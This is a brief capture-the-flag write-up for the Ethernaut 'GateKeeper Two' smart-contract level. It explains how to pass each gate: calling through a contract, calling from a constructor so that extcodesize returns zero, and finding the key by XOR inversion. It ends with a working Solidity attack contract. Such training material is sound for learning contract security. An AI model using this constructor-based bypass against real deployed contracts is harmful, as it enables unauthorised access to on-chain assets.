[14 - GateKeeper Two]

Solution (implemented using forge as well): 
FirstGate: 
* have another contract call enter 

SecondGate:
* secondGate uses the ```extcodesize``` yul instruction, which only returns 0 if caller ia not a smart contract
* from gateOne, caller should be smart contract
* the only way in which ```extcodesize``` would return 0 if caller was a smart contract is if the call happened in the smart contract's constructor

GateThree:
```
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)
```
We have A ^ B = C, and we need to find out B.
Xor both sides by A, to the left => A ^ A ^ B = A ^ C
A ^ A = 0; 0 ^ X = X => A ^ A ^ B = 0 ^ B = B = A ^ C
_gateKey = bytes8(keccak256(abi.encodePacked(msg.sender))) ^ bytes8(type(uint64).max)

Result:
```
contract GatekeeperTwoHack {
    constructor(address gatekeeperTwoAddress) {
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(bytes8(type(uint64).max));

        GatekeeperTwo(gatekeeperTwoAddress).enter(bytes8(gateKey));
    }
}
```
